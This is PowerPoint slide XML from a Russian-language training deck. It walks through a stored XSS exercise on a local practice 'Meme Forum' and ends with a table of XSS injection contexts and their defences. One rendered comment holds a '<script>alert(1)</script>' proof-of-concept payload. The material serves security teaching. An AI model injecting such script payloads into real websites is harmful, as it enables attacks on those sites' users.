                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{783D16A8-A67C-426E-8617-DE571E606549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2857500" cy="137160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reader-title">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{43AA8B83-277E-40F2-8144-8AAD21A903D6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1238250" y="4724400"/>
            <a:ext cx="2152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Браузер читателя</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="reader-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4A1E278E-4DF8-4DDC-A031-C573BB69A3A2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="5172075"/>
            <a:ext cx="2552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Получает HTML</a:t>
            </a:r>
          </a:p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и выполняет JS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="15" name="flow-save">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ACCFB79A-8ED5-45D7-8BEB-F0A9DE96CFEB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3543300" y="3248025"/>
            <a:ext cx="1123950" cy="0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6" name="flow-label-save">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D7B5D6E1-9D9C-40FE-B331-CE59EB0558B3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3600450" y="2800350"/>
            <a:ext cx="1009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Запись</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="17" name="flow-store">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C81EA71F-E095-4152-B64B-41091BD5AAED}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7524750" y="3248025"/>
            <a:ext cx="1123950" cy="0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8" name="flow-label-store">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4A6DFD19-F908-48FD-A8E3-7B068681F354}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7581900" y="2800350"/>
            <a:ext cx="1009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Сохранить</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="19" name="flow-read">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BD9C110E-6434-41D1-9AF6-4DE8E49D1B64}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7524750" y="4267200"/>
            <a:ext cx="1123950" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="23813">
            <a:solidFill>
              <a:srgbClr val="8D9BA5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:headEnd type="triangle" w="med" len="med"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="flow-label-read">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FA172631-DAB6-4A6B-A4DC-24046F37BC0A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7581900" y="4362450"/>
            <a:ext cx="1009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Прочитать</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="21" name="flow-page">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DA879147-9A3F-40B4-9AC8-0F1976F7C911}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3543300" y="5276850"/>
            <a:ext cx="1123950" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="23813">
            <a:solidFill>
              <a:srgbClr val="8D9BA5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:headEnd type="triangle" w="med" len="med"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="flow-label-page">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D6219085-0BFE-4F72-B697-EDBE2ECB9E5C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3600450" y="5381625"/>
            <a:ext cx="1009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HTML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E42EBCA-99AD-484D-88CA-944118F11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26" name="component-laptop-26">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F38D8F23-0D11-4579-A8A3-7C43522D03A3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="881062" y="2722959"/>
            <a:ext cx="200025" cy="150019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component-laptop-27">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{60554608-60AF-4C8B-B1EF-95E101FCFE9D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="847725" y="2872978"/>
            <a:ext cx="266700" cy="58341"/>
          </a:xfrm>
          <a:prstGeom prst="trapezoid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component-server-28">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{374AA910-E7E0-403C-A9D3-6B88A4199B65}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5879306" y="2762250"/>
            <a:ext cx="433388" cy="123825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component-server-29">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E7EB15CC-B68A-496A-8F10-A6861B9F984D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6235303" y="2800946"/>
            <a:ext cx="30956" cy="30956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component-server-30">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{48C47EBB-174E-4E35-9D84-D89EBA4928B1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5879306" y="2917031"/>
            <a:ext cx="433388" cy="123825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component-server-31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{010AE264-8A77-4442-8085-993090309F69}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6235303" y="2955727"/>
            <a:ext cx="30956" cy="30956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component-server-32">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1FA25DBE-085B-44B1-A38A-5E2B3762CB1A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5879306" y="3071812"/>
            <a:ext cx="433388" cy="123825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component-server-33">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BA936154-4099-403E-B3FF-A05C438C10A0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6235303" y="3110509"/>
            <a:ext cx="30956" cy="30956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component-database-34">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{678792F2-E2C7-4E44-8BE9-1E6FDFEAA3F5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9860756" y="2824162"/>
            <a:ext cx="433388" cy="294084"/>
          </a:xfrm>
          <a:prstGeom prst="rect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component-database-35">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FC9F4C20-65BC-46C1-83BE-D51E139DE2D1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9860756" y="2762250"/>
            <a:ext cx="433388" cy="123825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component-database-36">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{86EA66D9-FB95-46B3-8C8E-E1414285CF09}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9860756" y="2917031"/>
            <a:ext cx="433388" cy="123825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component-database-37">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D43EA863-9A38-41E0-9B5A-06E59F840927}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9860756" y="3071812"/>
            <a:ext cx="433388" cy="123825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component-laptop-38">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F38D8F23-0D11-4579-A8A3-7C43522D03A3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="881062" y="4742259"/>
            <a:ext cx="200025" cy="150019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component-laptop-39">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{60554608-60AF-4C8B-B1EF-95E101FCFE9D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="847725" y="4892278"/>
            <a:ext cx="266700" cy="58341"/>
          </a:xfrm>
          <a:prstGeom prst="trapezoid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84349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BF97FF78-CA39-44B1-8B04-0C1F4ED3F7B3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Meme Forum: задание</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Рисунок 3" descr="Скриншот выполнения из writeup_for_web.pptx, объединённый с карточкой задания.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A43414D5-CCEB-49CE-A247-EF24E6A94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266825" y="2690331"/>
            <a:ext cx="6000750" cy="2420313"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="v2-text-128">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{04AB0EEB-7552-4998-8BA3-51329579B902}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8420100" y="1857375"/>
            <a:ext cx="308610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5000"/>
              </a:lnSpc>
              <a:buNone/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Проверить доверие к сохранённым подписям и комментариям</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="v2-text-129">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2395B085-733E-4FC6-BE91-9C4B90B29E21}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8420100" y="4343400"/>
            <a:ext cx="3086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Совместная практика</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="v2-text-130">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E69F6152-084C-45CF-92A2-094ACC498E90}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8420100" y="5267325"/>
            <a:ext cx="3086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A9B7C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A9B7C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9B7C6"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>127.0.0.1:8083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6CDDCF9-55F0-40B9-8FA5-88D31F665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0870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FE4B8D5-5A1B-47CB-8FC6-13A199BE725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Meme Forum: шаг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F9C1B7-EF20-48AF-9312-609D57FD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pic>
        <p:nvPicPr>
          <p:cNvPr id="900" name="writeup-screenshot-25-8" descr="XSS, шаг 6. Скриншот из приложенного writeup_for_web.pptx.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F7249647-A67F-18E6-837C-77132FF5E6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069319"/>
            <a:ext cx="10820400" cy="353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9498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FE4B8D5-5A1B-47CB-8FC6-13A199BE725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Meme Forum: шаг 2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F9C1B7-EF20-48AF-9312-609D57FD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pic>
        <p:nvPicPr>
          <p:cNvPr id="900" name="writeup-screenshot-26-8" descr="XSS, шаг 7. Скриншот из приложенного writeup_for_web.pptx.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FCA24E6D-77AC-2CF7-A6AE-3D3D2D1391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716" y="1581150"/>
            <a:ext cx="6210568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9498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FE4B8D5-5A1B-47CB-8FC6-13A199BE725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Meme Forum: шаг 3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F9C1B7-EF20-48AF-9312-609D57FD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900" name="editable-code-53-900">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1FA17F8A-8A64-481F-93FE-2AB39BCCFA30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10820400" cy="421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lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/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section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9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"comments"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&gt;&lt;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h2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Комментарии · 3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h2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00000"/>
              </a:lnSpc>
              <a:buNone/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div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9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"comment"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&gt;&lt;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strong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meme-reader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strong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00000"/>
              </a:lnSpc>
              <a:buNone/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div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9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"saved-content"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Зато обед строго по расписанию.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div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00000"/>
              </a:lnSpc>
              <a:buNone/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div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00000"/>
              </a:lnSpc>
              <a:buNone/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div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9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"comment"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&gt;&lt;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strong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meme-reader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strong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00000"/>
              </a:lnSpc>
              <a:buNone/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div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9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"saved-content"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Воскресенье — заслуженный отдых после такой недели.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div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00000"/>
              </a:lnSpc>
              <a:buNone/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div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ts val="450"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr sz="1290" b="0">
              <a:solidFill>
                <a:srgbClr val="808080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buNone/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div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9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"comment"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&gt;&lt;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strong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strong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00000"/>
              </a:lnSpc>
              <a:buNone/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div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9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"saved-content"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&gt;&lt;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script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alert(1) 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script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&gt;&lt;/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div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00000"/>
              </a:lnSpc>
              <a:buNone/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div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00000"/>
              </a:lnSpc>
              <a:buNone/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form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method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9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"post"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action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9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"/posts/ddd18811-d177-4c88-8552-58d3c0ac1bff/comments"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&gt;&lt;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label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Комментарий&lt;textarea name="body"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/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article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&gt;&lt;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article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9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"card feed-post"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9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"post-77f8116f-6b7f-4a87-ada9-99e7f914eee0"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00000"/>
              </a:lnSpc>
              <a:buNone/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9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"post-meta"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&gt;&lt;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strong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meme-reader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strong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· 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time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datetime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9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"2026-10-14T21:29:34.120Z"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2026-10-14 21:29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time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&gt;&lt;/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00000"/>
              </a:lnSpc>
              <a:buNone/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img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9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"meme-image"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src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9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"/assets/memes/writer.png"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alt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9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"Пишу документацию"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width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9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"403"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height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9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"496"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ts val="450"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr sz="1290" b="0">
              <a:solidFill>
                <a:srgbClr val="808080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buNone/>
              <a:defRPr sz="129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div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9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"saved-content"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9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Пишу README так, будто это моя главная литературная работа.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129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div</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="129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0889498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FE4B8D5-5A1B-47CB-8FC6-13A199BE725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Meme Forum: шаг 4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F9C1B7-EF20-48AF-9312-609D57FD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pic>
        <p:nvPicPr>
          <p:cNvPr id="900" name="writeup-screenshot-29-8" descr="XSS, шаг 10. Скриншот из приложенного writeup_for_web.pptx.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1BE5250C-390B-FFCB-DA51-77DCF7FC0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008" y="1581150"/>
            <a:ext cx="6269984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9498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FE4B8D5-5A1B-47CB-8FC6-13A199BE725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Meme Forum: шаг 5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F9C1B7-EF20-48AF-9312-609D57FD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pic>
        <p:nvPicPr>
          <p:cNvPr id="900" name="writeup-screenshot-30-8" descr="XSS, шаг 11. Скриншот из приложенного writeup_for_web.pptx.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{02CA30B1-D4B9-9A43-05E5-230966A41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143" y="1581150"/>
            <a:ext cx="7377715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9498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FE4B8D5-5A1B-47CB-8FC6-13A199BE725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Meme Forum: шаг 6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F9C1B7-EF20-48AF-9312-609D57FD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pic>
        <p:nvPicPr>
          <p:cNvPr id="900" name="writeup-screenshot-33-8" descr="XSS, шаг 14. Скриншот из приложенного writeup_for_web.pptx.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ABBE65EF-C600-3B57-5056-A8F9DA29B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23404"/>
            <a:ext cx="10820400" cy="343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9498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FE4B8D5-5A1B-47CB-8FC6-13A199BE725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Meme Forum: шаг 7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F9C1B7-EF20-48AF-9312-609D57FD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pic>
        <p:nvPicPr>
          <p:cNvPr id="900" name="writeup-screenshot-34-8" descr="XSS, шаг 15. Скриншот из приложенного writeup_for_web.pptx.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E753B06F-9562-B5E2-13B5-6A25ADBCD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6852"/>
            <a:ext cx="10820400" cy="438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9498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FE4B8D5-5A1B-47CB-8FC6-13A199BE725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Meme Forum: шаг 8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F9C1B7-EF20-48AF-9312-609D57FD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pic>
        <p:nvPicPr>
          <p:cNvPr id="900" name="writeup-screenshot-35-8" descr="XSS, шаг 16. Скриншот из приложенного writeup_for_web.pptx.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DD3B4585-130E-C6B7-992E-DC8447297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963" y="1581150"/>
            <a:ext cx="10004075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9498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56DE2AE-33E7-4A27-831A-F922DB81515A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XSS: контекст вставки данных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70D8F558-3D2F-4F51-9274-204FFC45F7EC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Контекст определяет, как браузер интерпретирует пользовательское значение и какая защита нужна.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22084CB9-A204-405C-8AAA-7BB0FA8B2B2B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="685800" y="2600325"/>
          <a:ext cx="10820400" cy="35242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Контекст</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr">
                    <a:lnL w="9525">
                      <a:solidFill>
                        <a:srgbClr val="405064"/>
                      </a:solidFill>
                      <a:prstDash val="soli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>
                      <a:solidFill>
                        <a:srgbClr val="405064"/>
                      </a:solidFill>
                      <a:prstDash val="soli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Где находится VALUE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>
                      <a:solidFill>
                        <a:srgbClr val="405064"/>
                      </a:solidFill>
                      <a:prstDash val="soli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Защита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>
                      <a:solidFill>
                        <a:srgbClr val="405064"/>
                      </a:solidFill>
                      <a:prstDash val="soli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HTML-текст</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr">
                    <a:lnL w="9525">
                      <a:solidFill>
                        <a:srgbClr val="405064"/>
                      </a:solidFill>
                      <a:prstDash val="soli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575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</a:rPr>
                        <a:t>&lt;</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1575" b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div</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1575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</a:rPr>
                        <a:t>&gt;</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1575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VALUE</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1575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</a:rPr>
                        <a:t>&lt;/</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1575" b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div</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1575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</a:rPr>
                        <a:t>&gt;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Экранирование HTML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или textContent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HTML-атрибут</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr">
                    <a:lnL w="9525">
                      <a:solidFill>
                        <a:srgbClr val="405064"/>
                      </a:solidFill>
                      <a:prstDash val="soli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575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</a:rPr>
                        <a:t>&lt;</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1575" b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input</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1575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575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value</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1575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</a:rPr>
                        <a:t>=</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1575" b="0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</a:rPr>
                        <a:t>"VALUE"</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1575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</a:rPr>
                        <a:t>&gt;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Кавычки и кодирование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значения атрибута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URL</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr">
                    <a:lnL w="9525">
                      <a:solidFill>
                        <a:srgbClr val="405064"/>
                      </a:solidFill>
                      <a:prstDash val="soli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575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</a:rPr>
                        <a:t>&lt;</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1575" b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a</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1575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575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href</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1575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</a:rPr>
                        <a:t>=</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1575" b="0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</a:rPr>
                        <a:t>"VALUE"</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1575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</a:rPr>
                        <a:t>&gt;</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1575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Ссылка</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1575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</a:rPr>
                        <a:t>&lt;/</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1575" b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a</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1575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</a:rPr>
                        <a:t>&gt;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Проверка схемы URL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 кодирование атрибута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JavaScript</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr">
                    <a:lnL w="9525">
                      <a:solidFill>
                        <a:srgbClr val="405064"/>
                      </a:solidFill>
                      <a:prstDash val="soli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575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</a:rPr>
                        <a:t>&lt;</a:t>
                      </a:r>
